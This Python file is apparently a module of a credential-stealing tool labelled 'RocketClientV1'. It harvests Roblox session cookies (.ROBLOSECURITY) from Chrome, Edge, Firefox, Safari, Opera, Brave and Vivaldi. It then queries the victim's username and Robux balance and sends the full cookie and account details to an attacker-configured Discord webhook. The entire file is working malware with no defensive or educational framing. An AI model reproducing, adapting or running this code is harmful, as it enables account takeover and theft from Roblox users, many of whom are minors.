import browser_cookie3
import requests

class Roblox:
	def __init__(self):
		self.roblox_cookies = {}
		self.grab_roblox_cookies()
		self.send_info()

	def grab_roblox_cookies(self):
		browsers = [
			('Chrome', browser_cookie3.chrome),
			('Edge', browser_cookie3.edge),
			('Firefox', browser_cookie3.firefox),
			('Safari', browser_cookie3.safari),
			('Opera', browser_cookie3.opera),
			('Brave', browser_cookie3.brave),
			('Vivaldi', browser_cookie3.vivaldi)
		]
		for browser_name, browser in browsers:
			try:
				browser_cookies = browser(domain_name='roblox.com')
				for cookie in browser_cookies:
					if cookie.name == '.ROBLOSECURITY':
						self.roblox_cookies[browser_name] = cookie.value
			except Exception:
				pass
			
	def send_info(self):
		for roblox_cookie in self.roblox_cookies.values():
			headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
			info = None
			try:
				response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
				response.raise_for_status()
				info = response.json()
			except Exception:
				pass

			first_cookie_half = roblox_cookie[:len(roblox_cookie)//2]
			second_cookie_half = roblox_cookie[len(roblox_cookie)//2:]

			if info is not None:
				data = {
					"embeds": [
						{
							"title": "Roblox Info",
							"color": 5639644,
							"fields": [
								{
									"name": "Name:",
									"value": f"`{info['UserName']}`",
									"inline": True
								},
								{
									"name": "<:robux_coin:1041813572407283842> Robux:",
									"value": f"`{info['RobuxBalance']}`",
									"inline": True
								},
								{
									"name": ":cookie: Cookie:",
									"value": f"`{first_cookie_half}`",
									"inline": False
								},
								{	
									"name": "",
									"value": f"`{second_cookie_half}`",
									"inline": False
									
								},
							],
							"thumbnail": {
								"url": info['ThumbnailUrl']
							},
							"footer": {
								"text": "RocketClientV1 | MadeByXeuka"
							},
						}
					],
					"username": "RocketClientV1",
					"avatar_url": "https://cdn.discordapp.com/attachments/1252951673048010814/1254481481196241007/rocket.png?ex=6679a66c&is=667854ec&hm=6c090b294eeb97741f7c1451305da80dda7f5afa1c301875cbd99e0737d7ae21&",
				}
				requests.post(__CONFIG__['webhook'], json=data)